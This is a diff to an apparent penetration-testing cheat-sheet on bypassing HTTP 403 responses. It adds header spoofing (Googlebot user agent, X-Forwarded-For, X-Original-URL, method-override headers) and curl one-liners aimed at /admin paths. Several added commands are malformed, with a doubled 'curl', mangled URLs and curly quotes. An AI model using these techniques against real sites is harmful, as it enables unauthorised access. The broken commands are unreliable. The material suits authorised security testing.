@@ -3,9 +3,22 @@
 To bypass a forbidden response (HTTP 403), you can try various techniques such as:
 
 - **Changing the HTTP method** to GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED or HACK.
-- **Overriding the HTTP method** using headers like `X-HTTP-Method-Override: PUT`.
-- **Fuzzing HTTP headers** by changing the Host header or using proxy headers like `X-Forwarded-For: 127.0.0.1`.
+- **Changing user agent to:** `User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)`
+- **Overriding the HTTP method** using headers like:
+    - `X-HTTP-Method-Override: PUT`
+	- `X-HTTP-Method-Override: GET`
+	- `X-Original-Method: GET`
+	- `X-HTTP-Method: POST`
+- **Fuzzing HTTP headers** by changing the Host header or using proxy headers like:
+    - `X-Forwarded-For: 127.0.0.1`
+	- `Origin: <target>`
+	- `X-Host: <trusted_host>`
 - **Path fuzzing** by encoding (`%61dmin`) or using different cases (`aDmiN`), or appending file extensions like `admin.json`.
+- **Bypass 403 Forbidden** (with encoded special charecter) and curl tool:
+    - `curl -i https:%2F%2Ftarget.com/admin -H "X-Original-URL: /admin"`
+	- `curl -i https3A%2F%2Ftarget.com/admin -X POST -H "X-Custom-IP-Authorization: 127.0.0.1"`
+	- `curl curl -H “X-Forwarded-For: 1.1.1.1” <target>`
+	- `curl -H “Host: another-allowed-host.com” --resolve “sub.target.com:443:<targetIP>” <target>`
 - **Appending slash (/) or backslash (\)**: `/api//users` | `/api\\users`
 - **Trying different protocol versions** like HTTP/1.0 or HTTP/2.0.
 - **Directly contacting the IP or CNAME** of the domain.
